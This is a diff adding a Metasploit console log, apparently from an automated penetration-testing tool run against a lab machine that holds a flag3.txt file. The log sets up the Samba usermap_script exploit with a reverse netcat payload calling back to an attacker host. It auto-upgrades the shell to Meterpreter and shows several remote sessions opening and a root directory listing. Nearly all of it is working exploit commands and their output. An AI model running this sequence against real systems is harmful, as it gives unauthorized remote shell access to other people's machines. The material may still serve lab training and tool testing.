@@ -1,0 +1,78 @@
+[1m[34m[*][0m Spooling to file /home/kali/forcevector/logs/sessions/msfconsole_transcript_192.168.139.128_20260709_100448.txt...
+resource (/tmp/tmpp1z_1s4r.rc)> setg SessionLogging true
+[0mSession logging enabled.
+SessionLogging => true
+resource (/tmp/tmpp1z_1s4r.rc)> setg ConsoleLogging true
+[0mConsole logging is now enabled.
+ConsoleLogging => true
+resource (/tmp/tmpp1z_1s4r.rc)> setg ExitOnSession false
+[0mExitOnSession => false
+resource (/tmp/tmpp1z_1s4r.rc)> setg CommandShellPty true
+[0mCommandShellPty => true
+resource (/tmp/tmpp1z_1s4r.rc)> use exploits/multi/samba/usermap_script
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_netcat
+resource (/tmp/tmpp1z_1s4r.rc)> set RHOST 192.168.139.128
+[0mRHOST => 192.168.139.128
+resource (/tmp/tmpp1z_1s4r.rc)> set LHOST 192.168.139.129
+[0mLHOST => 192.168.139.129
+resource (/tmp/tmpp1z_1s4r.rc)> set LPORT 4444
+[0mLPORT => 4444
+resource (/tmp/tmpp1z_1s4r.rc)> set AutoRunScript post/multi/manage/shell_to_meterpreter
+[0mAutoRunScript => post/multi/manage/shell_to_meterpreter
+resource (/tmp/tmpp1z_1s4r.rc)> set payload cmd/unix/reverse_netcat
+[0mpayload => cmd/unix/reverse_netcat
+resource (/tmp/tmpp1z_1s4r.rc)> exploit
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.139.129:4444 
+[1m[34m[*][0m Session ID 1 (192.168.139.129:4444 -> 192.168.139.128:50878) processing AutoRunScript 'post/multi/manage/shell_to_meterpreter'
+[1m[33m[!][0m SESSION may not be compatible with this module:
+[1m[33m[!][0m  * Unknown session platform. This module works with: Linux, OSX, Unix, Solaris, BSD, Windows.
+[1m[34m[*][0m Upgrading session ID: 1
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[34m[*][0m Started reverse TCP handler on 192.168.139.129:4433 
+[1m[34m[*][0m Sending stage (1062760 bytes) to 192.168.139.128
+[1m[34m[*][0m Command stager progress: 100.00% (773/773 bytes)
+[1m[34m[*][0m Command shell session 1 opened (192.168.139.129:4444 -> 192.168.139.128:50878) at 2026-07-09 10:05:20 -0400
+
+[0m[1m[34m[*][0m Sending stage (1062760 bytes) to 192.168.139.128
+[0m[0mbin
+boot
+cdrom
+dev
+etc
+flag3.txt
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+[0m[0m[1m[34m[*][0m Session ID 2 (192.168.139.129:4433 -> 192.168.139.128:35991) processing AutoRunScript 'post/multi/manage/shell_to_meterpreter'
+[1m[34m[*][0m Session ID 3 (192.168.139.129:4433 -> 192.168.139.128:35992) processing AutoRunScript 'post/multi/manage/shell_to_meterpreter'
+[1m[34m[*][0m Stopping exploit/multi/handler
+[1m[34m[*][0m Upgrading session ID: 2
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[31m[-][0m Job 0 is listening on IP 192.168.139.129 and port 4433
+[1m[31m[-][0m A job is listening on the same local port
+[1m[31m[-][0m Failed to start exploit/multi/handler on 4433, it may be in use by another process.
+[1m[34m[*][0m Meterpreter session 2 opened (192.168.139.129:4433 -> 192.168.139.128:35991) at 2026-07-09 10:05:57 -0400
+[1m[34m[*][0m Upgrading session ID: 3
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[31m[-][0m Job 0 is listening on IP 192.168.139.129 and port 4433
+[1m[31m[-][0m A job is listening on the same local port
+[1m[31m[-][0m Failed to start exploit/multi/handler on 4433, it may be in use by another process.
+[1m[34m[*][0m Meterpreter session 3 opened (192.168.139.129:4433 -> 192.168.139.128:35992) at 2026-07-09 10:06:04 -0400
+/bin/sh: line 10: testls: command not found
+
+Abort session 1? [y/N]  
